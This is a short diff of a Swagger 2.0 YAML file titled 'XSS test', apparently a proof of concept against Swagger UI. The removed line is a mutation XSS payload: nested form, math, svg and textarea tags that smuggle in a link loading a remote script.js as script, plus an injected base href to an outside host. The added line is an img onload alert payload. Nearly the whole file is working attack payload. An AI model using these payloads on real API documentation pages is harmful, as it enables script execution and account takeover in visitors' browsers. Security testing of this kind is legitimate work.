@@ -1,5 +1,5 @@
 swagger: '2.0'
 info:
   title: XSS test
-  description: &lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;mglyph&gt;&lt;svg&gt;&lt;mtext&gt;&lt;textarea&gt;&lt;path id=&#34;&lt;/textarea&gt;&lt;a href=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/script.js data-type=script style=&#39;cursor: default;overflow: visible;width: 1000px;position: fixed;height: 2000px;margin: 0;display: block;box-sizing: initial;&#39; data-remote=true class=&#39;atwho-view select2-drop-mask pika-select&#39;&gt;&lt;div style=&#39;width: 100vw;height: 100vh;position: fixed;&#39;&gt;&lt;/div&gt;&lt;/a&gt;&lt;base href=&#39;https://ec2.ap-east-1.amazonaws.com/XD/&#39;&gt;&#34;&gt;&lt;/form&gt;
+  description: <a href="https://www.reddit.com/r/QuotesPorn/comments/12sje6f/social_media_made_yall_way_too_comfortable_with">Click Me</a><img src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHVramtqbnN3Ym8wbHFvcnM2ZjN2ZHAxNWR4OHFqdndnMzd3djFwNyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Vu5UbNpjpqfMq2UFg0/giphy.webp" onload="alert('Image loaded!')">>">
   version: production
